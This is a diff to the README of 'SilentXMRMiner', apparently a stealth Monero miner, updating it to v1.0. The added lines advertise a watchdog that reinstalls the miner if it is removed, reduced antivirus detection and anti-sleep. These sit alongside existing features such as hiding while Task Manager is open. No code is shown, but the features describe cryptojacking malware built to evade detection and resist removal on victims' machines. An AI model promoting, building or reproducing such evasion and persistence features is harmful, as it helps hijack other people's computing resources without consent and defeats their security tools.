@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">
 
-# SilentXMRMiner v0.9 - Based on Lime Miner v0.3
+# SilentXMRMiner v1.0 - Based on Lime Miner v0.3
 
 
 ## Main Features
@@ -17,6 +17,8 @@
 * Idle Mining - Can be configured to mine with a different Max CPU when computer is idle
   
 * Stealth - Pauses the miner while Task Manager is open
+
+* Watchdog - Replaces the miner if removed and starts it if closed down
  
 ## Prerequisites
 
@@ -32,6 +34,12 @@ Pre-Compiled: https://github.com/UnamSanctam/SilentXMRMiner/releases
 
 ## Changes
 
+# v1.0 (12/03/2021)
+* Updated miner
+* Decreased antivirus detections
+* Added a watchdog that replaces the miner if removed and starts it if closed down
+* Added anti-sleep
+* Fixed bugs
 # v0.9 (02/02/2021)
 * Updated miner
 * Greatly decreased antivirus detections
